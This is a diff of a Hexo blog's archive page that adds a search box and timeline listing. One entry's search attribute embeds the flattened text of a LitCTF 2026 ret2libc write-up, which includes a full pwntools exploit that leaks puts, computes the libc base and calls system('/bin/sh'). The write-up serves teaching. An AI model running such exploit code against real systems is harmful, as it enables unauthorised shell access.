@@ -72,7 +72,7 @@
             <span>&ensp;碎碎念</span>
         </a>
         
-        <a href="/archives">
+        <a href="/categories">
             <i class="fa-solid fa-box-archive fa-fw"></i>
             <span>&ensp;归档</span>
         </a>
@@ -119,7 +119,7 @@
                     </div>
                 </a>
                 
-                <a href="/archives">
+                <a href="/categories">
                     <div class="item">
                         <div style="min-width: 20px; max-width: 50px; width: 10%">
                             <i class="fa-solid fa-box-archive fa-fw"></i>
@@ -167,106 +167,172 @@
             
 <div id="archives">
     <style>
-    .archive-browser {
-        display: grid;
-        gap: 16px;
+    .archive-wrap {
+        max-width: 920px;
+        margin: 0 auto;
     }
 
-    .archive-folder {
-        position: relative;
-        border-left: 3px solid rgba(102, 175, 239, 0.18);
-        padding-left: 18px;
+    .archive-search {
+        position: sticky;
+        top: 24px;
+        z-index: 6;
+        margin: 0 auto 26px;
+        max-width: 720px;
     }
 
-    .archive-folder::before {
-        content: "";
-        position: absolute;
-        left: -6px;
-        top: 20px;
-        width: 10px;
-        height: 10px;
+    .archive-search input {
+        width: 100%;
+        padding: 16px 22px;
+        border: 1px solid rgba(225, 232, 242, 0.95);
         border-radius: 999px;
-        background: #00a596;
-        box-shadow: 0 0 0 4px rgba(0, 165, 150, 0.10);
+        background: rgba(255, 255, 255, 0.96);
+        box-shadow: 0 12px 26px rgba(120, 140, 160, 0.12);
+        font-size: 16px;
+        outline: none;
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
     }
 
-    .archive-folder-summary {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        padding: 6px 0 12px;
-        cursor: pointer;
-        list-style: none;
-        user-select: none;
-        font-size: 24px;
-        font-weight: 700;
+    .archive-search input:focus {
+        border-color: rgba(102, 175, 239, 0.4);
+        box-shadow: 0 14px 30px rgba(102, 175, 239, 0.14);
     }
 
-    .archive-folder-summary::-webkit-details-marker {
-        display: none;
-    }
-
-    .archive-folder-icon {
-        color: #00a596;
-        font-size: 18px;
-    }
-
-    .archive-folder-name {
-        flex: 1;
-    }
-
-    .archive-folder-count {
-        font-size: 12px;
-        color: #8a97a3;
-    }
-
-    .archive-folder-children {
-        margin-left: 14px;
+    .archive-list {
         display: grid;
-        gap: 12px;
+        gap: 0;
     }
 
-    .archive-folder-posts {
-        display: grid;
-        gap: 10px;
-        margin: 0 0 16px 6px;
-    }
-
-    .archive-post-row {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        gap: 12px;
-        padding: 14px 16px;
+    .archive-empty {
+        padding: 18px 20px;
         border-radius: 16px;
         background: #fff;
         border: 1px solid #e8edf5;
-        box-shadow: 0 8px 22px rgba(120, 140, 160, 0.10);
-        text-decoration: none;
-        color: inherit;
-        transition: transform .18s ease, box-shadow .18s ease;
-    }
-
-    .archive-post-row:hover {
-        transform: translateX(4px);
-        box-shadow: 0 12px 28px rgba(120, 140, 160, 0.14);
-    }
-
-    .archive-post-title {
-        font-size: 20px;
-        color: #2f3d4b;
-    }
-
-    .archive-post-date {
-        flex-shrink: 0;
-        font-size: 12px;
         color: #8a97a3;
+        text-align: center;
     }
     </style>
 
-    <div class="archive-browser">
-        <details class="archive-folder" open><summary class="archive-folder-summary"><span class="archive-folder-icon"><i class="fa-solid fa-folder"></i></span><span class="archive-folder-name">建站</span><span class="archive-folder-count">1</span></summary><div class="archive-folder-posts"><a class="archive-post-row" href="/2026/05/21/hello-world/"><span class="archive-post-title">博客已初始化</span><span class="archive-post-date">2026/5/21</span></a></div></details>
+    <div class="archive-wrap">
+        <div class="archive-search">
+            <input id="archive-search-input" type="text" placeholder="搜索标题、分类、标签、内容关键词" />
+        </div>
+
+        <div class="archive-list" id="archive-list">
+            
+            
+            <div class="timeline" data-search="litctf2026-ret2libcctfpwn基础题ret2libclitctf2026-ret2libc题目地址这道题还是挺简单的挺适合初学者做的前置知识补充：ret2libc攻击的核心思想是利用程序中的栈溢出漏洞，覆盖函数的返回地址，使其指向libc库中的system函数，并传递”&#x2f;bin&#x2f;sh”字符串作为参数，从而获得一个shell。想要进阶的理解的话可以看这个深入理解ret2libc技术-先知社区最基础的ret2libc甚至还给了pop_rdileak_valuechecksec一下ida一下发现这里有现成的可以利用的rdiret还有泄露地址的地方然后第一部分溢出之后然后泄露地址然后返回main函数，接受地址之后计算libc基址，然后溢出之后再binshfrompwnimport*context(os=&quot;linux&quot;,arch=&quot;amd64&quot;)elf=elf(&quot;./ret2libc&quot;)libc=elf(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)io=process(&quot;./ret2libc&quot;)#io=remote(&quot;challenge.cyclens.tech&quot;,30528)pop_rdi=0x4011b7ret=0x4011b8leak_value=0x4011c3main_addr=0x401234offset=72payload=b&quot;a&quot;*offsetpayload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(elf.got[&quot;puts&quot;])payload+=p64(leak_value)payload+=p64(ret)payload+=p64(main_addr)io.recvuntil(b&quot;tellmeyourname:&quot;)io.send(payload)io.recvuntil(b&quot;leak:&quot;)puts_addr=int(io.recvline().strip(),16)print(&quot;puts_addr=&quot;,hex(puts_addr))libc_base=puts_addr-libc.sym[&quot;puts&quot;]system_addr=libc_base+libc.sym[&quot;system&quot;]binsh_addr=libc_base+next(libc.search(b&quot;/bin/sh\x00&quot;))print(&quot;libc_base=&quot;,hex(libc_base))print(&quot;system_addr=&quot;,hex(system_addr))print(&quot;binsh_addr=&quot;,hex(binsh_addr))payload=b&quot;a&quot;*offsetpayload+=p64(pop_rdi)payload+=p64(binsh_addr)payload+=p64(ret)payload+=p64(system_addr)io.recvuntil(b&quot;tellmeyourname:&quot;)io.send(payload)io.interactive()">
+                <div class="timeline-tail"></div>
+                <div class="timeline-content">
+                    <div class="item-time">2026/5/23</div>
+                    <a href="/2026/05/23/litctf-2026-ret2libc/">
+                        <h3>LitCTF 2026 - ret2libc</h3>
+                    </a>
+                    <div class="info">
+                        
+                        <span class="category">
+                            <a href="/categories/CTF/">
+                                <span class="icon">
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                </span>
+                                CTF
+                            </a>
+                        </span>
+                        
+                        
+                        <span class="tags">
+                            <span class="icon">
+                                <i class="fa-solid fa-tags fa-fw"></i>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/%E5%9F%BA%E7%A1%80%E9%A2%98/" data-tag-name="基础题" data-tag-color-role="text">
+                                    基础题
+                                </a>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/ret2libc/" data-tag-name="ret2libc" data-tag-color-role="text">
+                                    ret2libc
+                                </a>
+                            </span>
+                            
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            
+            <div class="timeline" data-search="博客已初始化建站hexogithubpages这是博客的第一篇文章，用来确认站点已经搭建完成并可以正常发布。目前已经完成hexo本地环境已经配置好githubpages部署已经打通当前博客主题为particlex首页、导航、友情链接、邮箱复制等基础功能都已可用接下来可以做什么继续写你自己的第一篇正式文章修改头像、背景图和首页文案在友情链接页添加常看的博客按需切换到butterfly等其他主题常用命令npmrunservernpmrunbuildnpxhexodeploy说明这个博客目前托管在githubpages，上线后访问速度和页面更新会有少量缓存延迟，通常刷新或等待几分钟即可看到最新内容。以后你写新文章、换主题、修改首页信息，基本都可以通过项目根目录里的交互工具完成。">
+                <div class="timeline-tail"></div>
+                <div class="timeline-content">
+                    <div class="item-time">2026/5/21</div>
+                    <a href="/2026/05/21/hello-world/">
+                        <h3>博客已初始化</h3>
+                    </a>
+                    <div class="info">
+                        
+                        <span class="category">
+                            <a href="/categories/%E5%BB%BA%E7%AB%99/">
+                                <span class="icon">
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                </span>
+                                建站
+                            </a>
+                        </span>
+                        
+                        
+                        <span class="tags">
+                            <span class="icon">
+                                <i class="fa-solid fa-tags fa-fw"></i>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/Hexo/" data-tag-name="Hexo" data-tag-color-role="text">
+                                    Hexo
+                                </a>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/GitHub-Pages/" data-tag-name="GitHub Pages" data-tag-color-role="text">
+                                    GitHub Pages
+                                </a>
+                            </span>
+                            
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="archive-empty" id="archive-empty" style="display: none;">没有找到包含这些关键词的文章。</div>
+        </div>
     </div>
+
+    <script>
+    (() => {
+        const input = document.getElementById("archive-search-input");
+        const cards = Array.from(document.querySelectorAll(".timeline"));
+        const empty = document.getElementById("archive-empty");
+        if (!input) return;
+
+        const normalize = (value) => String(value || "").toLowerCase().replace(/\s+/g, "");
+        const filter = () => {
+            const keyword = normalize(input.value);
+            let visibleCount = 0;
+            cards.forEach((card) => {
+                const matched = !keyword || (card.dataset.search || "").includes(keyword);
+                card.style.display = matched ? "" : "none";
+                if (matched) visibleCount += 1;
+            });
+            empty.style.display = visibleCount ? "none" : "";
+        };
+
+        input.addEventListener("input", filter);
+        filter();
+    })();
+    </script>
 </div>
 
             <footer id="footer">
